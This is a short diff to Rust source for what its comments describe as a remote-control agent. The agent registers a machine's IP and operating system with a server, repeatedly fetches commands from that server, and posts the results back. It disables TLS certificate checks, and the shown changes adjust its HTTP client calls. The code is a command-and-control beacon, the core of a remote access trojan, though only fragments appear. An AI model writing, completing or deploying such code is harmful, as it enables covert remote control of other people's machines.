@@ -1,7 +1,6 @@
 //Get local IP and OS, make a POST request to [SERVER]/newHost and record identifier
 //Constantly pull the page [SERVER]/IDENTIFIER/commands and POST results to [SERVER]/IDENTIFIER/responses
 
-use reqwest::blocking::Client;
 use std::{thread,time};
 use std::process::{Command, Stdio};
 use std::time::Duration;
@@ -25,7 +24,6 @@ fn initHost(host_ip:&str) -> Option<String>{
         os = "Linux";
     }
     let text = format!("{{\"IP\": \"{}\", \"OS\": \"{}\"}}",ip,os);
-    // let client = reqwest::blocking::Client::new();
     let client = reqwest::blocking::Client::builder()
         .danger_accept_invalid_certs(true)
         .build()
@@ -70,7 +68,7 @@ fn getCommands(identifier:&str){
         .danger_accept_invalid_certs(true)
         .build()
         .unwrap();
-	let res = match client.get(commands_url).send(){
+	let res = match client.post(commands_url).send(){
         Ok(ok)=>{
             ok.text().unwrap()
         }, Err(_)=>{
